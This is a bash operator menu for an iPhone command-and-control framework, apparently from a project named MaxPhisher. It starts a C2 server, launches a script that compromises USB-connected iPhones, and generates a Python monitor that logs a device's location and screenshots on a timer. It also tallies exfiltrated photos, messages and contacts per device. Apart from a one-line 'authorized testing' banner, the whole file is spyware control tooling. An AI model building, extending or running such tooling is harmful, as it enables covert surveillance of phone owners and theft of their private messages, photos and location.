#!/bin/bash
# Quick start script for iPhone C2 operations

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

clear

echo -e "${GREEN}"
cat << "EOF"
╔═══════════════════════════════════════════════════════════╗
║                                                           ║
║          iPhone Remote Access Framework                   ║
║                                                           ║
║  Complete control over compromised iPhone devices         ║
║                                                           ║
╚═══════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${YELLOW}[!] For authorized security testing only${NC}\n"

# Check if running in MaxPhisher directory
if [[ ! -f "iphone_remote_access.py" ]]; then
    echo -e "${RED}[!] Error: Run this script from MaxPhisher directory${NC}"
    exit 1
fi

# Main menu
echo "Select operation:"
echo ""
echo "1) Start C2 Server"
echo "2) Compromise iPhone (USB connected)"
echo "3) Control iPhone (Interactive)"
echo "4) Monitor iPhone (Continuous)"
echo "5) View Exfiltrated Data"
echo "6) Stop C2 Server"
echo "7) View C2 Logs"
echo "8) System Status"
echo ""
read -p "Choice [1-8]: " choice

case $choice in
    1)
        echo -e "\n${GREEN}[*] Starting C2 Server...${NC}"
        
        if systemctl is-active --quiet iphone-c2; then
            echo -e "${YELLOW}[*] C2 server already running${NC}"
            echo -e "${GREEN}[*] Status:${NC}"
            systemctl status iphone-c2 --no-pager
        else
            # Check if systemd service exists
            if [[ -f /etc/systemd/system/iphone-c2.service ]]; then
                sudo systemctl start iphone-c2
                echo -e "${GREEN}[+] C2 server started via systemd${NC}"
            else
                echo -e "${YELLOW}[*] Starting C2 server in background...${NC}"
                nohup python3 c2_server.py server > c2.log 2>&1 &
                echo $! > .c2_pid
                echo -e "${GREEN}[+] C2 server started (PID: $(cat .c2_pid))${NC}"
            fi
            
            sleep 2
            
            # Test connection
            if curl -s http://localhost:8443/health > /dev/null 2>&1; then
                echo -e "${GREEN}[+] C2 server is responding${NC}"
            else
                echo -e "${RED}[!] C2 server may not be running properly${NC}"
            fi
        fi
        
        # Show encryption key if available
        if [[ -f .encryption_key ]]; then
            echo -e "\n${GREEN}[*] Encryption Key:${NC}"
            cat .encryption_key
        else
            echo -e "\n${YELLOW}[*] Check c2.log for encryption key${NC}"
        fi
        ;;
        
    2)
        echo -e "\n${GREEN}[*] Compromising iPhone...${NC}"
        
        # Check if device connected
        if ! command -v idevice_id &> /dev/null; then
            echo -e "${RED}[!] libimobiledevice not installed${NC}"
            echo -e "${YELLOW}[*] Install with: brew install libimobiledevice${NC}"
            exit 1
        fi
        
        DEVICES=$(idevice_id -l)
        if [[ -z "$DEVICES" ]]; then
            echo -e "${RED}[!] No iPhone detected${NC}"
            echo -e "${YELLOW}[*] Connect iPhone via USB and trust this computer${NC}"
            exit 1
        fi
        
        echo -e "${GREEN}[+] Device detected: $DEVICES${NC}"
        
        # Run compromise script
        python3 compromise_iphone.py
        ;;
        
    3)
        echo -e "\n${GREEN}[*] Launching iPhone Control Panel...${NC}"
        python3 control_iphone.py
        ;;
        
    4)
        echo -e "\n${GREEN}[*] Starting continuous monitoring...${NC}"
        echo -e "${YELLOW}[*] Press Ctrl+C to stop${NC}\n"
        
        # Create monitoring script if not exists
        if [[ ! -f monitor_iphone.py ]]; then
            cat > monitor_iphone.py << 'PYEOF'
#!/usr/bin/env python3
import asyncio
import json
from datetime import datetime
from pathlib import Path
from iphone_remote_access import iPhoneRemoteControl

async def monitor():
    Path("tracking").mkdir(exist_ok=True)
    
    controller = iPhoneRemoteControl(
        c2_server="http://localhost:8443",
        encryption_key=Path(".encryption_key").read_text().strip()
    )
    
    device_id = input("Enter device UDID: ").strip()
    
    print(f"[*] Monitoring {device_id}...")
    print("[*] Tracking: Location (5m), Screenshot (10m), Clipboard (2m)")
    
    while True:
        try:
            # Location every 5 minutes
            location = await controller.track_location(device_id)
            if location:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                Path(f"tracking/location_{ts}.json").write_text(json.dumps(location, indent=2))
                print(f"[+] Location saved: {ts}")
            
            await asyncio.sleep(300)
            
            # Screenshot every 10 minutes
            screenshot = await controller.capture_screen(device_id)
            if screenshot:
                ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                Path(f"tracking/screenshot_{ts}.png").write_bytes(screenshot)
                print(f"[+] Screenshot saved: {ts}")
            
            await asyncio.sleep(600)
            
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            await asyncio.sleep(60)
    
    await controller.close()

asyncio.run(monitor())
PYEOF
            chmod +x monitor_iphone.py
        fi
        
        python3 monitor_iphone.py
        ;;
        
    5)
        echo -e "\n${GREEN}[*] Exfiltrated Data:${NC}\n"
        
        if [[ -d exfiltrated_data ]]; then
            ls -lah exfiltrated_data/
            
            echo -e "\n${GREEN}[*] Device directories:${NC}"
            for device_dir in exfiltrated_data/*/; do
                if [[ -d "$device_dir" ]]; then
                    device=$(basename "$device_dir")
                    echo -e "\n${YELLOW}Device: $device${NC}"
                    
                    if [[ -d "${device_dir}photos" ]]; then
                        photo_count=$(ls -1 "${device_dir}photos" 2>/dev/null | wc -l)
                        echo "  Photos: $photo_count files"
                    fi
                    
                    if [[ -d "${device_dir}messages" ]]; then
                        msg_count=$(ls -1 "${device_dir}messages" 2>/dev/null | wc -l)
                        echo "  Messages: $msg_count files"
                    fi
                    
                    contacts=$(ls -1 "${device_dir}"contacts_*.db 2>/dev/null | wc -l)
                    if [[ $contacts -gt 0 ]]; then
                        echo "  Contacts: $contacts database(s)"
                    fi
                fi
            done
        else
            echo -e "${YELLOW}[*] No exfiltrated data yet${NC}"
        fi
        ;;
        
    6)
        echo -e "\n${GREEN}[*] Stopping C2 Server...${NC}"
        
        if systemctl is-active --quiet iphone-c2; then
            sudo systemctl stop iphone-c2
            echo -e "${GREEN}[+] C2 server stopped${NC}"
        elif [[ -f .c2_pid ]]; then
            kill $(cat .c2_pid) 2>/dev/null || true
            rm .c2_pid
            echo -e "${GREEN}[+] C2 server stopped${NC}"
        else
            echo -e "${YELLOW}[*] C2 server not running${NC}"
        fi
        ;;
        
    7)
        echo -e "\n${GREEN}[*] C2 Server Logs:${NC}\n"
        
        if systemctl is-active --quiet iphone-c2; then
            sudo journalctl -u iphone-c2 -n 50 --no-pager
        elif [[ -f c2.log ]]; then
            tail -n 50 c2.log
        else
            echo -e "${YELLOW}[*] No logs found${NC}"
        fi
        ;;
        
    8)
        echo -e "\n${GREEN}[*] System Status:${NC}\n"
        
        # C2 Server
        echo -e "${YELLOW}C2 Server:${NC}"
        if systemctl is-active --quiet iphone-c2; then
            echo -e "  Status: ${GREEN}Running (systemd)${NC}"
            systemctl status iphone-c2 --no-pager | grep -E "(Active|Main PID)"
        elif [[ -f .c2_pid ]] && kill -0 $(cat .c2_pid) 2>/dev/null; then
            echo -e "  Status: ${GREEN}Running (background)${NC}"
            echo "  PID: $(cat .c2_pid)"
        else
            echo -e "  Status: ${RED}Stopped${NC}"
        fi
        
        # Database
        echo -e "\n${YELLOW}Database:${NC}"
        if [[ -f c2_data.db ]]; then
            echo "  Path: c2_data.db"
            echo "  Size: $(du -h c2_data.db | cut -f1)"
            
            device_count=$(sqlite3 c2_data.db "SELECT COUNT(*) FROM devices;" 2>/dev/null || echo "0")
            echo "  Devices: $device_count"
            
            command_count=$(sqlite3 c2_data.db "SELECT COUNT(*) FROM commands;" 2>/dev/null || echo "0")
            echo "  Commands: $command_count"
        else
            echo -e "  ${YELLOW}Not created yet${NC}"
        fi
        
        # Exfiltrated Data
        echo -e "\n${YELLOW}Exfiltrated Data:${NC}"
        if [[ -d exfiltrated_data ]]; then
            echo "  Path: exfiltrated_data/"
            echo "  Size: $(du -sh exfiltrated_data | cut -f1)"
            device_count=$(ls -1d exfiltrated_data/*/ 2>/dev/null | wc -l)
            echo "  Devices: $device_count"
        else
            echo -e "  ${YELLOW}No data yet${NC}"
        fi
        
        # Connected Devices
        echo -e "\n${YELLOW}Connected Devices (USB):${NC}"
        if command -v idevice_id &> /dev/null; then
            DEVICES=$(idevice_id -l)
            if [[ -n "$DEVICES" ]]; then
                echo "$DEVICES" | while read device; do
                    echo "  - $device"
                    ideviceinfo -u "$device" 2>/dev/null | grep -E "(DeviceName|ProductVersion)" | sed 's/^/    /'
                done
            else
                echo -e "  ${YELLOW}None${NC}"
            fi
        else
            echo -e "  ${YELLOW}libimobiledevice not installed${NC}"
        fi
        ;;
        
    *)
        echo -e "${RED}[!] Invalid choice${NC}"
        exit 1
        ;;
esac

echo ""
